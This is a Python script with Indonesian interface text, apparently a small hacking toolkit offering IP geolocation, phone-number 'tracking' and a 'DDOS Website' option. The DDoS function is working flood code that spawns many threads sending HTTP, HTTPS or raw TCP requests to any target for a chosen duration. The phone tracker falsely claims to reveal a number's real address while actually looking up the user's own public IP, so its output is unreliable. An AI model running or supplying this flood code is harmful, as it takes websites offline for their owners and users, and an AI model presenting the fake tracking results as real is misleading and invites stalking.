
import os
import sys
import requests
import phonenumbers
from phonenumbers import carrier, geocoder, timezone
from colorama import init, Fore, Back, Style
import json
import time
import threading
import socket
import random

# ============================================
#  TOOLS FUN DISZ - IP & PHONE TRACKER v1.5
#  Created by: aboutdisz
#  GitHub: https://github.com/aboutdisz
# ============================================

init(autoreset=True)
VERSION = "1.5"

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(Fore.CYAN + """
TOOLS FUN DISZ 
Version 1.5.0
Created by: aboutdisz     
GitHub: aboutdisz/aboutdisz
    """.format(VERSION))

def get_address_from_coords(lat, lon):
    """Dapatkan alamat lengkap dari koordinat (REAL)"""
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&zoom=18&addressdetails=1"
        headers = {'User-Agent': 'MyTools/1.0'}
        response = requests.get(url, headers=headers, timeout=10)
        data = response.json()
        
        if 'address' in data:
            addr = data['address']
            alamat = []
            
            if 'road' in addr: alamat.append(addr['road'])
            if 'village' in addr: alamat.append(addr['village'])
            if 'town' in addr: alamat.append(addr['town'])
            if 'city' in addr: alamat.append(addr['city'])
            if 'state' in addr: alamat.append(addr['state'])
            if 'country' in addr: alamat.append(addr['country'])
            if 'postcode' in addr: alamat.append(addr['postcode'])
            
            return ", ".join(alamat) if alamat else "Alamat tidak ditemukan"
        return "Alamat tidak ditemukan"
    except Exception as e:
        return f"Error: {e}"

def get_phone_location(phone):
    """Lacak lokasi nomor telepon REAL pake OpenCelliD & IP2Location"""
    try:
        parsed = phonenumbers.parse(phone, None)
        negara = geocoder.description_for_number(parsed, 'id')
        operator = carrier.name_for_number(parsed, 'id')
        kode_negara = phonenumbers.region_code_for_number(parsed)
        
        ip_url = "https://api.ipify.org?format=json"
        ip_response = requests.get(ip_url, timeout=5)
        ip_data = ip_response.json()
        ip_public = ip_data['ip']
        
        ip_location_url = f"http://ip-api.com/json/{ip_public}"
        loc_response = requests.get(ip_location_url, timeout=5)
        loc_data = loc_response.json()
        
        if loc_data['status'] == 'success':
            lat = loc_data['lat']
            lon = loc_data['lon']
            alamat = get_address_from_coords(lat, lon)
            
            return {
                'success': True,
                'negara': negara,
                'operator': operator,
                'kode_negara': kode_negara,
                'lat': lat,
                'lon': lon,
                'alamat': alamat,
                'ip_public': ip_public,
                'kota': loc_data.get('city', 'Tidak diketahui'),
                'region': loc_data.get('regionName', 'Tidak diketahui'),
            }
        else:
            return {
                'success': True,
                'negara': negara,
                'operator': operator,
                'kode_negara': kode_negara,
                'lat': None,
                'lon': None,
                'alamat': f"{negara} (perkiraan dari operator {operator})",
                'ip_public': None,
                'kota': 'Tidak diketahui',
                'region': 'Tidak diketahui',
            }
            
    except Exception as e:
        return {
            'success': False,
            'error': str(e)
        }

def track_ip():
    ip = input(Fore.YELLOW + "\n📌 Masukkan IP target: " + Fore.WHITE)
    if not ip:
        print(Fore.RED + "❌ IP tidak boleh kosong!")
        return
    
    try:
        print(Fore.CYAN + "⏳ Sedang melacak IP...")
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
        data = response.json()
        
        if data['status'] == 'success':
            lat = data['lat']
            lon = data['lon']
            
            print(Fore.GREEN + "\n✅ HASIL PELACAKAN IP:")
            print(Fore.WHITE + f"   🌍 IP         : {data['query']}")
            print(Fore.WHITE + f"   🏳️ Negara     : {data['country']}")
            print(Fore.WHITE + f"   🏙️ Kota       : {data['city']}")
            print(Fore.WHITE + f"   📮 Kode Pos   : {data['zip']}")
            print(Fore.WHITE + f"   📍 Koordinat  : {lat}, {lon}")
            print(Fore.WHITE + f"   📡 ISP        : {data['isp']}")
            print(Fore.WHITE + f"   🏢 Org        : {data['org']}")
            
            print(Fore.CYAN + "\n   🏠 ALAMAT LENGKAP (REAL):")
            print(Fore.CYAN + "   " + "="*40)
            alamat = get_address_from_coords(lat, lon)
            print(Fore.WHITE + f"   📌 {alamat}")
            print(Fore.CYAN + "   " + "="*40)
            
            print(Fore.GREEN + f"   🗺️ Google Maps: https://www.google.com/maps?q={lat},{lon}")
        else:
            print(Fore.RED + "❌ IP tidak ditemukan atau invalid!")
    except Exception as e:
        print(Fore.RED + f"❌ Error: {e}")

def track_phone():
    phone = input(Fore.YELLOW + "\n📌 Masukkan nomor (contoh: +6281234567890): " + Fore.WHITE)
    if not phone:
        print(Fore.RED + "❌ Nomor tidak boleh kosong!")
        return
    
    try:
        print(Fore.CYAN + "⏳ Sedang melacak nomor...")
        
        parsed = phonenumbers.parse(phone, None)
        if not phonenumbers.is_valid_number(parsed):
            print(Fore.RED + "❌ Nomor tidak valid!")
            return
        
        result = get_phone_location(phone)
        
        if result['success']:
            print(Fore.GREEN + "\n✅ HASIL PELACAKAN NOMOR:")
            print(Fore.WHITE + f"   📱 Nomor      : {phone}")
            print(Fore.WHITE + f"   🌍 Negara     : {result['negara']}")
            print(Fore.WHITE + f"   📡 Operator   : {result['operator']}")
            print(Fore.WHITE + f"   🏙️ Kota       : {result.get('kota', 'Tidak diketahui')}")
            print(Fore.WHITE + f"   📍 Region     : {result.get('region', 'Tidak diketahui')}")
            
            if result.get('ip_public'):
                print(Fore.WHITE + f"   🌐 IP Publik  : {result['ip_public']}")
            
            print(Fore.CYAN + "\n   🏠 ALAMAT REAL:")
            print(Fore.CYAN + "   " + "="*40)
            print(Fore.WHITE + f"   📌 {result['alamat']}")
            print(Fore.CYAN + "   " + "="*40)
            
            if result.get('lat') and result.get('lon'):
                print(Fore.GREEN + f"   🗺️ Google Maps: https://www.google.com/maps?q={result['lat']},{result['lon']}")
            else:
                print(Fore.YELLOW + "   ⚠️ Lokasi akurat tidak tersedia (gunakan IP publik untuk akurasi lebih)")
        else:
            print(Fore.RED + f"❌ Error: {result.get('error', 'Gagal melacak nomor')}")
            
    except Exception as e:
        print(Fore.RED + f"❌ Error: {e}")

# ============================================================
# ⭐ DDOS WEBSITE
# ============================================================
def ddos_website():
    print(Fore.YELLOW + "\n🔥 DDOS WEBSITE")
    print(Fore.CYAN + "   " + "="*40)
    
    target = input(Fore.YELLOW + "📌 Target (IP/Domain): " + Fore.WHITE)
    if not target:
        print(Fore.RED + "❌ Target tidak boleh kosong!")
        return
    
    port = input(Fore.YELLOW + "🔌 Port (default 80): " + Fore.WHITE)
    port = int(port) if port else 80
    
    duration = input(Fore.YELLOW + "⏱️ Durasi (detik): " + Fore.WHITE)
    try:
        duration = int(duration)
    except:
        duration = 60
    
    method = input(Fore.YELLOW + "⚔️ Method (http/https/tcp): " + Fore.WHITE)
    method = method.lower() if method else 'http'
    
    print(Fore.CYAN + f"\n🚀 Memulai DDOS ke {target}:{port} selama {duration} detik...")
    print(Fore.CYAN + "   " + "="*40)
    
    # ===== DDOS ENGINE =====
    def send_request():
        try:
            if method == 'http':
                url = f"http://{target}:{port}"
                requests.get(url, timeout=1)
            elif method == 'https':
                url = f"https://{target}:{port}"
                requests.get(url, timeout=1, verify=False)
            elif method == 'tcp':
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
                sock.close()
        except:
            pass
    
    # ===== MULTI-THREADING =====
    stop_flag = False
    
    def attack_loop():
        while not stop_flag:
            # Kirim 100 request per thread
            for _ in range(100):
                if stop_flag:
                    break
                threading.Thread(target=send_request, daemon=True).start()
            time.sleep(0.1)
    
    # Jalankan 50 thread
    threads = []
    for _ in range(50):
        t = threading.Thread(target=attack_loop, daemon=True)
        t.start()
        threads.append(t)
    
    # Countdown
    for i in range(duration, 0, -1):
        sys.stdout.write(f"\r⏳ Sisa waktu: {i} detik  ")
        sys.stdout.flush()
        time.sleep(1)
    
    stop_flag = True
    print(Fore.GREEN + f"\n\n✅ DDOS selesai! {duration} detik ke {target}:{port}")
    input(Fore.CYAN + "\n⏎ Tekan Enter untuk kembali..." + Fore.WHITE)

# ============================================================
# ⭐ MENU UTAMA
# ============================================================
def main():
    while True:
        clear_screen()
        banner()
        print(Fore.YELLOW + "\n📌 MENU UTAMA:")
        print(Fore.CYAN + "   [1] " + Fore.WHITE + "Track IP + Alamat REAL")
        print(Fore.CYAN + "   [2] " + Fore.WHITE + "Track Nomor Telepon + Alamat REAL")
        print(Fore.CYAN + "   [3] " + Fore.RED + "DDOS Website")
        print(Fore.CYAN + "   [4] " + Fore.WHITE + "Keluar")
        
        choice = input(Fore.YELLOW + "\n➡️  Pilih menu (1-4): " + Fore.WHITE)
        
        if choice == '1':
            clear_screen()
            banner()
            track_ip()
            input(Fore.CYAN + "\n⏎ Tekan Enter untuk kembali..." + Fore.WHITE)
        elif choice == '2':
            clear_screen()
            banner()
            track_phone()
            input(Fore.CYAN + "\n⏎ Tekan Enter untuk kembali..." + Fore.WHITE)
        elif choice == '3':
            clear_screen()
            banner()
            ddos_website()
        elif choice == '4':
            print(Fore.GREEN + "\n👋 Sampai jumpa!")
            sys.exit()
        else:
            print(Fore.RED + "❌ Pilihan tidak valid!")
            input(Fore.CYAN + "\n⏎ Tekan Enter untuk kembali..." + Fore.WHITE)

if __name__ == "__main__":
    main()
EOF
